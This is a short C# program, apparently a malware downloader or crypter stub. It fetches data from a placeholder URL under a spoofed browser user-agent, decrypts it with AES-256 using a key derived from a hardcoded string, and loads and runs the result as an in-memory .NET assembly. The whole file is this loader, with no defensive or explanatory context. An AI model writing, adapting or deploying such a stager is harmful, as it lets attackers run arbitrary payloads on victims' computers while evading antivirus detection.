using System;
using System.Net;

namespace HB
{
   public static class HxB
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
      public  static void Main()
        {
            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
            byte[] i =wc.DownloadData("Link...");
            var m = Encryptor(ref i);
            AppDomain.CurrentDomain.Load(m).EntryPoint.Invoke(0, null);
        }
        public static byte[] Encryptor(ref byte[] data)
        {
            System.Security.Cryptography.SHA256CryptoServiceProvider a = new System.Security.Cryptography.SHA256CryptoServiceProvider();
            byte[] m = a.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("SHA256CryptoServiceProvider"));
            System.Security.Cryptography.RijndaelManaged i = new System.Security.Cryptography.RijndaelManaged();
            i.KeySize = 256;
            i.Key = m;
            i.Mode = System.Security.Cryptography.CipherMode.ECB;
            i.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
            byte[] x = i.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
            return x;
        }
    }
}